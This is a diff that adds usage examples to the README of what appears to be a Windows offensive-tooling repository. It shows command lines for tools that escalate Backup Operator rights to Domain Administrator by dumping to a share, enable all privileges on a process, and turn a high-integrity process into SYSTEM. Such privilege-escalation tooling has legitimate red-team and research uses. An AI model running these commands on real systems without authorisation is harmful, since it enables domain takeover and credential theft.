@@ -6,13 +6,41 @@
 
 As the name implies - with the right group / privileges - "there be dragons".
 
+```powershell
+# Dump workgroup box
+.\BackupOperatorToDomainAdministrator.exe HOSTNAME/user:password@HOSTNAME \\HOSTNAME\share\
+
+# Dump domain box
+.\BackupOperatorToDomainAdministrator.exe DOMAIN/user:password@ip \\HOSTNAME\share\
+```
+
 ### ModifyPrivilege.zig
 
 Modify a processes privileges (enable/disable/remove)
 
+```powershell
+# Enable all privileges to the current terminal
+.\ModifyPrivilege.exe 0
+
+# Enable all privilges on this PID
+.\ModifyPrivilege.exe <some pid>
+```
+
 ### HighToSystem.zig
 
 Provided a process in a 'high' context - leverage that to obtain `SYSTEM`.
+
+```
+.\HighToSystem.exe <pid> <fullpath to an executable>
+```
+
+### Shortcut.zig
+
+Provided a quick utility to create shortcuts from the command line.
+
+```
+ .\Shortcut.exe  C:\windows\system32\cmd.exe C:\users\username\desktop\cmd.lnk C:\
+```
 
 ### Shellcode
 
